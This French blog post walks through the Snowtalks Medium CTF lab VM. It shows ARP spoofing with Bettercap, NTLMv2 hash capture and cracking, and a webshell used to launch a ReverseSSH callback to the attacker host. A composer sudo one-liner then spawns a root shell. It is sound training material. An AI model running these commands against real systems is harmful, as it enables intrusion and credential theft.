# Solution du CTF Snowtalks Medium de iamv1nc3nt

Cul de sac
----------

Après [le précédent CTF](http://devloop.users.sourceforge.net/index.php?article263/solution-du-ctf-snowtalks-easy-de-iamv1nc3nt) trop facile j'ai décidé de continuer sur les CTFs de [iamv1nc3nt](https://iamv1nc3nt.com/) mais avec une difficulté accrue.  

Le *Snowtalks Medium* se présente (comme son nom l'indique) comme un CTF de difficulté intermédiaire.  

```plain
$ sudo nmap -sCV -T5 -p- 192.168.56.24 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-07 13:42 CET 
Nmap scan report for 192.168.56.24 
Host is up (0.00018s latency). 
Not shown: 65533 closed tcp ports (reset) 
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) 
| ssh-hostkey:  
|   3072 04:78:dc:f9:47:ac:02:c1:d5:39:e9:03:0a:ae:ea:0b (RSA) 
|   256 e8:9f:87:bc:4f:bf:00:70:b0:f9:12:24:ba:99:f9:60 (ECDSA) 
|_  256 51:cc:ca:46:d6:a4:d5:89:32:54:39:97:98:b8:20:e8 (ED25519) 
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu)) 
|_http-generator: WordPress 5.8.3 
|_http-title: Snowtalks-Medium &#8211; Just another WordPress site 
|_http-server-header: Apache/2.4.41 (Ubuntu) 
MAC Address: 08:00:27:A7:17:D0 (Oracle VirtualBox virtual NIC) 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On remarque rapidement dans le code source de la page une référence au nom d'hôte *snow-med* et on ajoute aussitôt une entrée dans notre fichier */etc/hosts*.  

On relève aussi la présence d'un post nommé *We Were Hacked* dont le contenu est le suivant :  

> On or about November 10, 2021, This Website (“TW”) experienced a network security incident, which resulted in the potential compromise of a portion of TW’s environment. The incident was first discovered on November 10, 2021, when visitors of TW were “locked out” of the server. In response, among other things, TW immediately retained Kevin Mandia, aka Dreamboat, to conduct a thorough forensic investigation into the circumstances surrounding the incident.  
> 
>   
> 
> The investigation into this breach is ongoing and our web developer, Coffeez, has been working closely with Kevin. Oddly close, one might say. Our old site has been archived and is currently being analyzed.  
> 
>   
> 
> The current theory is that hackers were able to gain access through WordPress and they uploaded something malicious to allow them to move from the “Dark Web” to our server.  
> 
>   
> 
> We will update you as we learn more….

Ma première réaction fut de dégainer *feroxbuster* à la recherche d'éventuelles backdoors laissées par les assaillants... aucun résultat n'en est ressorti.  

J'ai par la suite tenté d'extraire des informations utile du Wordpress à l'aide de *wpscan* mais n'ai rien eu de bien utile comme la liste des thèmes installés ou la version du logiciel :  

```plain
[+] WordPress version 5.8.3 identified (Latest, released on 2022-01-06). 
 | Found By: Rss Generator (Passive Detection) 
 |  - http://snow-med/index.php/feed/, <generator>https://wordpress.org/?v=5.8.3</generator> 
 |  - http://snow-med/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8.3</generator>
```

J'ai tenté de brute-forcer le compte *admin* et j'ai jeté l'éponge après plusieurs heures avec le sentiment de suivre le mauvais chemin.  

Cette aventure m'aura tout de même fait remarquer une incohérence sur le scanner *wpscan* : l'option d'énumération *ap* est destinée à énumérer tous les plugins (**A**ll **P**lugins), on est donc en mesure d'attendre un scan exhaustif.  

Pourtant si on regarde plus en détails [la documentation](https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation#enumeration-modes) on découvre que le mode d'énumération par défaut est *passive*, sous entendu que le scanner ne génère pas de requêtes pour tester la présence des plugins, par conséquent non exhaustif.  

La commande pour forcer le mode approprié pour ce CTF est donc :  

```bash
docker run --add-host snow-med:192.168.56.24 -it --rm wpscanteam/wpscan --url http://snow-med/ -e ap --plugins-detection aggressive
```

Le module d'énumération *Wordpress* de Wapiti fonctionne sur la même idée que le mode *aggresive* :  

```plain
$ wapiti -u http://192.168.56.24/ -m wp_enum
ujson module not found, using json 
msgpack not installed, MsgPackSerializer unavailable 

     __    __            _ _   _ _____ 
    / / /\ \ \__ _ _ __ (_) |_(_)___ / 
    \ \/  \/ / _` | '_ \| | __| | |_ \ 
     \  /\  / (_| | |_) | | |_| |___) | 
      \/  \/ \__,_| .__/|_|\__|_|____/ 
                  |_|                  
Wapiti 3.1.0 (wapiti.sourceforge.io) 
[*] Enregistrement de l'état du scan, veuillez patienter... 

[*] Lancement du module wp_enum 
Version de WordPress : N/A 
---- 
Enumération des extensions WordPress : 
akismet 4.2.1 détecté 
duplicator 1.3.26 détecté 
---- 
Enumération des thèmes WordPress : 
twentytwentyone 1.4 détecté 
twentytwenty 1.8 détecté 
twentynineteen 2.1 détecté
```

Ça devient intéressant car le plugin *Duplicator* est [vulnérable à une faille de directory traversal](https://www.wordfence.com/blog/2020/02/active-attack-on-recently-patched-duplicator-plugin-vulnerability-affects-over-1-million-sites/). L'exploitation [est triviale](https://www.exploit-db.com/exploits/50420) et il y a aussi [un template Nuclei](https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2020/CVE-2020-11738.yaml) pour cette vulnérabilité.  

Seulement *Nuclei* ne détecte pas la vulnérabilité et une exploitation manuelle n'aboutit pas non plus...  

Who has Bob? Tell Alice
-----------------------

Après toujours plus d'énumération mais pas plus de résultats j'ai demandé un indice à l'auteur du CTF qui m'a conseillé d'écouter le réseau.  

```bash
sudo tshark -i vboxnet0
```

Après un moment j'ai remarqué que la VM tentait de se connecter sur les ports SMB du router VirtualBox (si la VM est configurée en mode *Réseau privé hôte*, VirtualBox défini une IP pour un routeur virtuel).  

```plain
    9 147.411538079 192.168.56.24 → 192.168.56.1 TCP 74 44644 → 445 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=3050540630 TSecr=0 WS=128 
   10 147.411609532 192.168.56.1 → 192.168.56.24 TCP 54 445 → 44644 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0 
   11 147.430322712 192.168.56.24 → 192.168.56.1 TCP 74 38828 → 139 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=3050540648 TSecr=0 WS=128 
   12 147.430392257 192.168.56.1 → 192.168.56.24 TCP 54 139 → 38828 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0
```

Il nous faudrait prendre la place du router (192.168.56.1) et mettre en écoute un serveur SMB pour voir si on peut capter quelque chose d'intéressant.  

L'idée pour *prendre la place* du routeur aux yeux de la victime (192.168.56.24) est de la bombarder de réponses ARP associant notre adresse MAC à l'adresse IP du routeur.  

Il y a différents outils pour faire ceci, de l'utilitaire *arpspoof* (inclus dans le paquet *dsniff* de mémoire), Ettercap ou encore [Bettercap](https://www.bettercap.org/) qui est celui que j'ai choisi.  

Ne trouvant pas de paquets officiels pour ma distribution, je me suis servi de l'image Docker   

```bash
docker run -it --privileged --net=host bettercap/bettercap -iface vboxnet0
```

Sans être expert Docker je suppose que l'option *--net=host* intègre les interfaces de l'hôte dans le container. Il faut ensuite définir notre cible et activer le ARP spoofing :  

```plain
192.168.56.0/24 > 192.168.56.1  » [14:57:34] [sys.log] [war] Could not find mac for  
192.168.56.0/24 > 192.168.56.1  » set arp.spoof.targets 192.168.56.24 
192.168.56.0/24 > 192.168.56.1  » arp.spoof on 
[14:58:10] [sys.log] [inf] arp.spoof starting net.recon as a requirement for arp.spoof 
192.168.56.0/24 > 192.168.56.1  » [14:58:10] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets. 
192.168.56.0/24 > 192.168.56.1  » [14:58:10] [endpoint.new] endpoint 192.168.56.24 detected as 08:00:27:73:ac:d3 (PCS Computer Systems GmbH).
```

On peut si on le souhaite ouvrir un petit tshark / wireshark pour voir le spoofing à l'oeuvre. Après on utilise le serveur SMB de Impacket en mode debug pour obtenir les éventuels hashs *netntlmv2* :  

```plain
$ sudo python examples/smbserver.py -debug -smb2support yolo /tmp/jail/

Impacket v0.9.22.dev1+20200424.150528.c44901d1 - Copyright 2020 SecureAuth Corporation 

[*] Config file parsed 
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
[*] Config file parsed 
[*] Config file parsed 
[*] Config file parsed 
[*] Incoming connection (192.168.56.24,43602) 
[*] AUTHENTICATE_MESSAGE (WORKGROUP\bonkachu,SNOW-MED) 
[*] User SNOW-MED\bonkachu authenticated successfully 
[*] bonkachu::WORKGROUP:4141414141414141:b8422cbc02b30c49258d64c9b96fe0d9:0101000000000000009bce5bfd1cd801066bd61b8d7eb0b60000000001001000570048007a004f0064004e0048004c0003001000570048007a004f0064004e0048004c00
020010006d0052004e0058007100610054007100040010006d0052004e005800710061005400710007000800009bce5bfd1cd801060004000200000008003000300000000000000000000000000000000382d2249b4d43d3203c929fcbf09d6c86591573094c9b6e39
db9a0e74d707e50a001000000000000000000000000000000000000900220063006900660073002f003100390032002e003100360038002e00350036002e00310000000000 
[*] Connecting Share(1:IPC$) 
[*] NetrShareEnum Level: 1 
[*] Disconnecting Share(1:IPC$) 
[*] Closing down connection (192.168.56.24,43602) 
[*] Remaining connections []
```

Sans entrer trop dans les détails j'ai un environnement Python virtuel (utilisant *pipenv*) pour *Impacket*. Vu que j'utilise *sudo* pour que *Impacket* écoute sur un port privilégié il ne sera pas capable d'utiliser le bon interpréteur Python (il va tenter d'utiliser celui du système au lieu du virtuel). Pour régler cela il faut spécifier le chemin complet du bon interpréteur (obtenu avec un *which python* une fois l'environnement activé).  

C'est tout pour cette aparté qui vous sera peut être utile une jour :)  

On peut casser le hash avec *John The Ripper*. L'avantage de JTR est qu'il se charge de détecter le type de hash comme un grand :  

```plain
$ john --wordlist=/tools/wordlists/rockyou.txt /tmp/hash.txt  
Using default input encoding: UTF-8 
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64]) 
Will run 4 OpenMP threads 
Press 'q' or Ctrl-C to abort, almost any other key for status 
madison          (bonkachu)      
1g 0:00:00:00 DONE (2022-02-08 16:17) 50.00g/s 102400p/s 102400c/s 102400C/s sokar..marion 
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably 
Session completed.
```

Ayé, on peut se connecter sur le SSH :  

```plain
bonkachu@snow-med:~$ crontab -l 
*/5 * * * * /home/bonkachu/.../share.sh 
bonkachu@snow-med:~$ cat /home/bonkachu/.../share.sh 
#!/bin/bash 
tmpfile=$(mktemp) 
/usr/sbin/arp -a | cut -d'(' -f2 | cut -d')' -f1 > ${tmpfile} 
input=${tmpfile} 
while IFS= read -r line; do /usr/bin/smbclient -L \\"$line" -U=bonkachu%madison; done < $input
```

Apache... 2
-----------

On a différents services en écoute sur la machine :  

```plain
bonkachu@snow-med:~$ ss -lntp 
State                    Recv-Q                   Send-Q                 Local Address:Port               Peer Address:Port
LISTEN                   0                        128                          0.0.0.0:22                      0.0.0.0:*
LISTEN                   0                        511                        127.0.0.1:9090                    0.0.0.0:*
LISTEN                   0                        70                         127.0.0.1:33060                   0.0.0.0:*
LISTEN                   0                        151                        127.0.0.1:3306                    0.0.0.0:*
LISTEN                   0                        4096                   127.0.0.53%lo:53                      0.0.0.0:*
LISTEN                   0                        128                             [::]:22                         [::]:*
LISTEN                   0                        511                                *:80                            *:*
```

Commençons par MySQL et les identifiants présents dans le fichier */var/www/html/wp-config.php* :  

```php
/** The name of the database for WordPress */ 
define( 'DB_NAME', 'wordpress' ); 

/** MySQL database username */ 
define( 'DB_USER', 'webuser' ); 

/** MySQL database password */ 
define( 'DB_PASSWORD', 'HiLoYLOu7456' ); 

/** MySQL hostname */ 
define( 'DB_HOST', 'localhost' );
```

On peut ainsi récupérer le hash de l'admin Wordpress :  

```plain
bonkachu@snow-med:/var/www/html$ mysql -u webuser -pHiLoYLOu7456 wordpress 
mysql: [Warning] Using a password on the command line interface can be insecure. 
Reading table information for completion of table and column names 
You can turn off this feature to get a quicker startup with -A 

Welcome to the MySQL monitor.  Commands end with ; or \g. 
Your MySQL connection id is 100275 
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu) 

Copyright (c) 2000, 2021, Oracle and/or its affiliates. 

Oracle is a registered trademark of Oracle Corporation and/or its 
affiliates. Other names may be trademarks of their respective 
owners. 

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement. 

mysql> select * from wp_users; 
+----+------------+------------------------------------+---------------+-------------------+-----------------+---------------------+---------------------+-------------+--------------+ 
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url        | user_registered     | user_activation_key | user_status | display_name | 
+----+------------+------------------------------------+---------------+-------------------+-----------------+---------------------+---------------------+-------------+--------------+ 
|  1 | admin      | $P$BPzWJ21tO864eNXhqgSsZumh2KXH6n/ | admin         | admin@example.com | http://snow-med | 2021-12-31 14:48:41 |                     |           0 | admin        | 
+----+------------+------------------------------------+---------------+-------------------+-----------------+---------------------+---------------------+-------------+--------------+ 
1 row in set (0.00 sec)
```

J'ai tenté de le casser mais cela n'a rien donné. L'utilisateur MySQL a assez de droits pour voir les hashs dans la table *mysql.users* mais il n'y avait rien d'intéressant.  

Reste le port 9090 qui est un second hôte virtuel d'Apache :  

```plain
bonkachu@snow-med:~$ cd /etc/apache2/sites-enabled/    
bonkachu@snow-med:/etc/apache2/sites-enabled$ ls 
000-default.conf  coffeez.conf 
bonkachu@snow-med:/etc/apache2/sites-enabled$ cat coffeez.conf  
<VirtualHost *:9090> 

        ServerAdmin webmaster@localhost 
        DocumentRoot /home/coffeez/www 

        ErrorLog ${APACHE_LOG_DIR}/error.log 
        CustomLog ${APACHE_LOG_DIR}/access.log combined 

        <Directory /home/coffeez/www> 
          Require all granted 
        </Directory> 

</VirtualHost> 

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

On ne peux pas accéder à ce dossier, on va donc requêter le serveur :  

```html
bonkachu@snow-med:~$ curl http://127.0.0.1:9090/ 
<html> 
<h1>APT1337 is in the house....</h1> 
<h3>Are your files are belong to us.</h3> 
<h3>We have locked your files and we will only unlock them when you pay us $1M in l33tcoin.</h3> 
</html>
```

Pour en avoir plus on va bruteforcer ce site mais il faut d'abord forwarder le port du serveur pour utiliser nos d'outils d'énumération locaux :  

```bash
ssh -N -L 9090:127.0.0.1:9090 bonkachu@192.168.56.24
```

```plain
$ feroxbuster -u http://127.0.0.1:9090/ -w /tools/fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-files.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://127.0.0.1:9090/
 🚀  Threads               │ 50
 📖  Wordlist              │ /tools/fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-files.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        5l       32w      191c http://127.0.0.1:9090/index.html
403        9l       28w      276c http://127.0.0.1:9090/.htaccess
200        5l       32w      191c http://127.0.0.1:9090/
403        9l       28w      276c http://127.0.0.1:9090/.html
403        9l       28w      276c http://127.0.0.1:9090/.php
403        9l       28w      276c http://127.0.0.1:9090/.htpasswd
403        9l       28w      276c http://127.0.0.1:9090/.htm
403        9l       28w      276c http://127.0.0.1:9090/.htpasswds
200        0l        0w        0c http://127.0.0.1:9090/cmd.php
403        9l       28w      276c http://127.0.0.1:9090/.htgroup
403        9l       28w      276c http://127.0.0.1:9090/wp-forum.phps
403        9l       28w      276c http://127.0.0.1:9090/.htaccess.bak
403        9l       28w      276c http://127.0.0.1:9090/.htuser
403        9l       28w      276c http://127.0.0.1:9090/.htc
403        9l       28w      276c http://127.0.0.1:9090/.ht
403        9l       28w      276c http://127.0.0.1:9090/.htacess
403        9l       28w      276c http://127.0.0.1:9090/.htaccess.old
[####################] - 18s    37034/37034   0s      found:17      errors:0      
[####################] - 17s    37034/37034   2114/s  http://127.0.0.1:9090/
```

L'argument à passer sur ce webshell se devine facilement :  

```plain
$ curl 'http://127.0.0.1:9090/cmd.php?cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(coffeez)
```

J'ai uploadé un ReverseSSH sur la VM puis l'ai exécuté via le webshell :  

```plain
curl "http://127.0.0.1:9090/cmd.php?cmd=/dev/shm/reverse-sshx64+-v+-p+7777+192.168.56.1+2>%261"
```

Une fois le shell PTY obtenu je liste les fichiers du groupe *coffeez* vu que l'on dispose des droits :  

```plain
www-data@snow-med:/home/coffeez/www$ find / -group coffeez 2> /dev/null | grep -v /proc/ 
/home/coffeez 
/home/coffeez/.local 
/home/coffeez/.local/share 
/home/coffeez/.cache 
/home/coffeez/.bash_history 
/home/coffeez/www 
/home/coffeez/www/cmd.php 
/home/coffeez/www/index.html 
/home/coffeez/www/wordpress-files.zip
```

Dragon Slayer
-------------

L'archive ZIP demande un mot de passe si on tente de la décompresser. *zip2john* et *JtR* à la rescousse :  

```plain
$ john --wordlist=/tools/wordlists/rockyou.txt /tmp/hash.txt  
Using default input encoding: UTF-8 
Loaded 1 password hash (PKZIP [32/64]) 
Will run 4 OpenMP threads 
Press 'q' or Ctrl-C to abort, almost any other key for status 
dragon           (wordpress-files.zip)      
1g 0:00:00:00 DONE (2022-02-08 16:51) 100.0g/s 819200p/s 819200c/s 819200C/s sokar..123456p 
Use the "--show" option to display all of the cracked passwords reliably 
Session completed.
```

On trouve dans la configuration du Wordpress des identifiants différents :  

```php
/** The name of the database for WordPress */ 
define( 'DB_NAME', 'wordpress' ); 

/** MySQL database username */ 
define( 'DB_USER', 'coffeez' ); 

/** MySQL database password */ 
define( 'DB_PASSWORD', 'Thursdays0700' ); 

/** MySQL hostname */ 
define( 'DB_HOST', 'localhost' );
```

Ceux ci permettent l'accès SSH sur le compte *coffeez*.  

L'utilisateur peur *composer* :  

```plain
coffeez@snow-med:~$ sudo -l 
[sudo] password for coffeez:  
Matching Defaults entries for coffeez on snow-med: 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 

User coffeez may run the following commands on snow-med: 
    (ALL) /usr/local/bin/composer
```

Cette commande ne m'évoque pour ainsi dire rien :  

```plain
coffeez@snow-med:~$ composer help 
Usage: 
  help [options] [--] [<command_name>] 

Arguments: 
  command                        The command to execute 
  command_name                   The command name [default: "help"] 

Options: 
      --xml                      To output help as XML 
      --format=FORMAT            The output format (txt, xml, json, or md) [default: "txt"] 
      --raw                      To output raw command help 
  -h, --help                     Display this help message 
  -q, --quiet                    Do not output any message 
  -V, --version                  Display this application version 
      --ansi                     Force ANSI output 
      --no-ansi                  Disable ANSI output 
  -n, --no-interaction           Do not ask any interactive question 
      --profile                  Display timing and memory usage information 
      --no-plugins               Whether to disable plugins. 
      --no-scripts               Skips the execution of all scripts defined in composer.json file. 
  -d, --working-dir=WORKING-DIR  If specified, use the given directory as working directory. 
      --no-cache                 Prevent use of the cache 
  -v|vv|vvv, --verbose           Increase the verbosity of messages: 1 for normal output, 2 for more verbose output and 3 for debug 

Help: 
  The help command displays help for a given command: 

    php /usr/local/bin/composer help list 

  You can also output the help in other formats by using the --format option: 

    php /usr/local/bin/composer help --format=xml list 

  To display the list of available commands, please use the list command.
```

En fouillant dans [la documentation](https://getcomposer.org/doc/03-cli.md#run-script) je note deux utilisations intéressantes :  

* run-script : To run scripts manually you can use this command, give it the script name and optionally any required arguments.
* exec : Executes a vendored binary/script. You can execute any command and this will ensure that the Composer bin-dir is pushed on your PATH before the command runs.

La documentation décrit aussi comment on peut définir [les scripts via une liste de hooks](https://getcomposer.org/doc/articles/scripts.md#defining-scripts).  

J'avoue que j'ai préféré me baser sur le GTFObin pour avoir un exemple tout fait :  

```plain
coffeez@snow-med:~$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > composer.json    
coffeez@snow-med:~$ sudo /usr/local/bin/composer --working-dir=. run-script x 
[sudo] password for coffeez:  
Do not run Composer as root/super user! See https://getcomposer.org/root for details 
Continue as root/super user [yes]? yes 
> /bin/sh -i 0<&3 1>&3 2>&3 
# id 
uid=0(root) gid=0(root) groups=0(root) 
# cd /root 
# ls 
root.txt  snap 
# cat root.txt 

███████ ███    ██  ██████  ██     ██ ████████  █████  ██      ██   ██ ███████   
██      ████   ██ ██    ██ ██     ██    ██    ██   ██ ██      ██  ██  ██        
███████ ██ ██  ██ ██    ██ ██  █  ██    ██    ███████ ██      █████   ███████   
     ██ ██  ██ ██ ██    ██ ██ ███ ██    ██    ██   ██ ██      ██  ██       ██   
███████ ██   ████  ██████   ███ ███     ██    ██   ██ ███████ ██   ██ ███████   

    ██████   ██████  ██████  ██████                                             
         ██ ██  ████      ██      ██                                            
     █████  ██ ██ ██  █████   █████                                             
    ██      ████  ██ ██      ██                                                 
    ███████  ██████  ███████ ███████                                            

███    ███ ███████ ██████  ██ ██    ██ ███    ███     ██████   ██████  ██   ██  
████  ████ ██      ██   ██ ██ ██    ██ ████  ████     ██   ██ ██    ██  ██ ██   
██ ████ ██ █████   ██   ██ ██ ██    ██ ██ ████ ██     ██████  ██    ██   ███    
██  ██  ██ ██      ██   ██ ██ ██    ██ ██  ██  ██     ██   ██ ██    ██  ██ ██   
██      ██ ███████ ██████  ██  ██████  ██      ██     ██████   ██████  ██   ██  

    ██████   ██████   ██████  ████████ ███████ ██████                           
    ██   ██ ██    ██ ██    ██    ██    ██      ██   ██                          
    ██████  ██    ██ ██    ██    ██    █████   ██   ██                          
    ██   ██ ██    ██ ██    ██    ██    ██      ██   ██                          
    ██   ██  ██████   ██████     ██    ███████ ██████                           

I hope you enjoyed this box. 

Twitter:  @iamv1nc3nt
```

Bon CTF mais on ne pense jamais à partir sur le scénario de l'écoute du réseau.

*Published February 08 2022 at 21:10*